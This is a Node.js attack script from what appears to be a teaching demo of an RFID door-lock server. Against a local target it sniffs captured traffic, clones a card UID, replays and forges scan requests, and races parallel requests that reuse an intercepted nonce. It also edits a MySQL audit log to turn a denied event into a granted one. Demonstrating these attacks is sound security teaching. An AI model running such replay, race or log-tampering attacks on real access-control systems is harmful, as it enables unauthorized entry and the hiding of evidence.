// ─────────────────────────────────────────────────────────────────────────────
// attacker/attack.js – Automated security exploits
//
// ⚠️ BOUNDARY NOTE ⚠️
// This script simulates an EXTERNAL attacker. It does NOT import any server
// code, nor does it read card/wallet.json. It operates solely by:
//   1. Reading the proxy's packet capture (capture.jsonl).
//   2. Sending HTTP requests directly to the lock (:3000).
//   3. Connecting to MySQL directly using .env credentials (simulating an
//      attacker who breached the database but not the application server).
// ─────────────────────────────────────────────────────────────────────────────

import 'dotenv/config';
import fs    from 'node:fs';
import path  from 'node:path';
import { fileURLToPath } from 'node:url';
import mysql from 'mysql2/promise';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const capturePath = path.join(__dirname, 'capture.jsonl');
const clonePath   = path.join(__dirname, 'cloned-card.json');
const TARGET_URL  = 'http://127.0.0.1:3000';

const args = process.argv.slice(2);
const cmd  = args[0];

// ── Helpers ──────────────────────────────────────────────────────────────────
function readCapture() {
  if (!fs.existsSync(capturePath)) return [];
  const lines = fs.readFileSync(capturePath, 'utf-8').split('\n').filter(Boolean);
  return lines.map(l => JSON.parse(l));
}

function getLastScan(mode) {
  const cap = readCapture();
  const scans = cap.filter(c => c.method === 'POST' && c.url === `/api/${mode}/scan`);
  if (scans.length === 0) {
    console.error(`No intercepted ${mode} scans found in capture.jsonl`);
    process.exit(1);
  }
  return scans[scans.length - 1].reqBody;
}

// ── Commands ─────────────────────────────────────────────────────────────────
async function runCommand() {
  switch (cmd) {
    case 'sniff': {
      console.log(JSON.stringify(readCapture(), null, 2));
      break;
    }

    case 'clone': {
      // Find the last scanned UID from any mode
      const cap = readCapture();
      const scans = cap.filter(c => c.method === 'POST' && c.reqBody && c.reqBody.uid);
      if (scans.length === 0) {
        console.error('No UIDs found in capture.');
        process.exit(1);
      }
      const uid = scans[scans.length - 1].reqBody.uid;
      fs.writeFileSync(clonePath, JSON.stringify({ uid }));
      console.log(`[Attacker] Cloned UID ${uid} to ${clonePath}`);
      break;
    }

    case 'replay': {
      // Usage: npm run attack -- replay --mode v1
      const modeIdx = args.indexOf('--mode');
      const mode = modeIdx > -1 ? args[modeIdx + 1] : 'v1';
      
      const payload = getLastScan(mode);
      console.log(`[Attacker] Replaying ${mode} scan:`, payload);
      
      const res = await fetch(`${TARGET_URL}/api/${mode}/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      console.log(`[Attacker] Result: HTTP ${res.status}`, await res.text());
      break;
    }

    case 'forge-ts': {
      // Extract UID from last v2 scan, but supply a fresh timestamp
      const oldPayload = getLastScan('v2');
      const payload = { uid: oldPayload.uid, ts: new Date().toISOString() };
      console.log('[Attacker] Forging fresh timestamp for v2 scan:', payload);
      
      const res = await fetch(`${TARGET_URL}/api/v2/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      console.log(`[Attacker] Result: HTTP ${res.status}`, await res.text());
      break;
    }

    case 'race': {
      // Usage: npm run attack -- race --n 10
      const nIdx = args.indexOf('--n');
      const n = nIdx > -1 ? parseInt(args[nIdx + 1], 10) : 10;

      const payload = getLastScan('v3');
      console.log(`[Attacker] Firing ${n} parallel v3 requests using intercepted nonce...`);
      
      const promises = [];
      for (let i = 0; i < n; i++) {
        promises.push(
          fetch(`${TARGET_URL}/api/v3/scan`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          }).then(r => r.json())
        );
      }
      
      const results = await Promise.all(promises);
      const grants = results.filter(r => r.result === 'granted').length;
      console.log(`[Attacker] Race complete. Requests granted: ${grants} out of ${n}`);
      break;
    }

    case 'tamper-log': {
      // Simulate an attacker directly editing the database to cover their tracks
      const pool = mysql.createPool({
        host: process.env.DB_HOST || '127.0.0.1',
        user: process.env.DB_USER || 'root',
        password: process.env.DB_PASSWORD || '',
        database: process.env.DB_NAME || 'rfid_lock',
      });

      console.log('[Attacker] Connecting to database...');
      // Find the most recent 'denied' event
      const [rows] = await pool.query("SELECT * FROM events WHERE result = 'denied' ORDER BY id DESC LIMIT 1");
      if (!rows.length) {
        console.error('[Attacker] No denied events found to tamper with.');
        process.exit(1);
      }
      
      const targetId = rows[0].id;
      console.log(`[Attacker] Found denied event ID ${targetId}. Changing to 'granted'...`);
      
      // Update it without fixing the hashes
      await pool.query("UPDATE events SET result = 'granted', reason = 'granted' WHERE id = ?", [targetId]);
      console.log(`[Attacker] Row ${targetId} tampered! The hash chain is now broken.`);
      console.log(`[Attacker] -> Check the Dashboard's verification badge.`);
      
      await pool.end();
      break;
    }

    default:
      console.error(`Unknown command: ${cmd}`);
      console.log(`Commands: sniff, clone, replay, forge-ts, race, tamper-log`);
      process.exit(1);
  }
}

runCommand().catch(console.error);
